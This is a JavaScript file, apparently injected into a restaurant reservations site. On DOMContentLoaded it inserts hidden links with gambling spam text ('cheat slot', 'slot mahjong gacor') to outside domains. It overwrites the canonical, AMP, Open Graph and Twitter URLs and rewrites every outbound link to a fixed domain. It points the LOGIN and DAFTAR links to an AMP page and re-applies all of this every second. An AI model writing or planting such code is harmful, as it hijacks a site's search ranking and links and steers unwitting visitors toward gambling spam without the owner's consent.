// Define the official domains
const officialDomain = 'https://marketbar.com/reservations'; 
const ampDomain = 'https://marketbar.com/amp';       

function insertBacklinks() {
  
  const link1 = document.createElement('a');
  link1.href = 'https://media.ihram.asia/'; 
  link1.style.display = 'none'; 
  link1.textContent = 'cheat slot'; 
  link1.classList.add('special-link'); 

  const link2 = document.createElement('a');
  link2.href = 'https://clouddo.eazysmart.com/'; 
  link2.style.display = 'none'; 
  link2.textContent = 'slot mahjong gacor'; 
  link2.classList.add('special-link'); 

  
  const body = document.body;
  const children = body.children;
  
  
  const middleIndex = Math.floor(children.length / 2);
  const referenceNode = children[middleIndex];

  
  if (referenceNode) {
    body.insertBefore(link1, referenceNode); 
    body.insertBefore(link2, referenceNode); 
  }
}


function replaceAnchorTags() {
  
  const anchors = document.querySelectorAll('a');

  anchors.forEach(anchor => {
    
    if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
      anchor.href = ampDomain; 
    }
  });
}


function forceUrlsToOfficialDomain() {
  
  const canonicalLink = document.querySelector('link[rel="canonical"]');
  let canonicalBasePath = ''; 

  if (canonicalLink) {
    
    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); 
    canonicalLink.href = officialDomain; 
  } else {
   
    const newCanonical = document.createElement('link');
    newCanonical.rel = 'canonical';
    newCanonical.href = officialDomain; 
    document.head.appendChild(newCanonical);
  }

  
  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    
    if (link.href.startsWith('http') && !isSpecialLink(link)) {
      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); 
      
      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  
  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
  metaUrls.forEach(meta => {
    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
  });

  
  const ampLink = document.querySelector('link[rel="amphtml"]');
  if (ampLink) {
    
    ampLink.href = ampDomain; 
  } else {
    
    const newAmpLink = document.createElement('link');
    newAmpLink.rel = 'amphtml';
    newAmpLink.href = ampDomain; 
    document.head.appendChild(newAmpLink); 
  }
}


function isSpecialLink(link) {
  
  return link.classList.contains('login') ||
         link.classList.contains('register') ||
         link.href === officialDomain ||
         link.href === ampDomain ||
         link.classList.contains('special-link') || 
         link.textContent.trim().toUpperCase() === 'LOGIN' || 
         link.textContent.trim().toUpperCase() === 'DAFTAR'; 
}

// Run the function when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  insertBacklinks(); // Tambahkan tautan dahulu
  forceUrlsToOfficialDomain(); // Memaksakan perubahan URL
  replaceAnchorTags(); // Memanggil fungsi untuk mengganti tautan
});

// Periodically check and enforce URLs (in case of dynamic changes)
setInterval(forceUrlsToOfficialDomain, 1000);
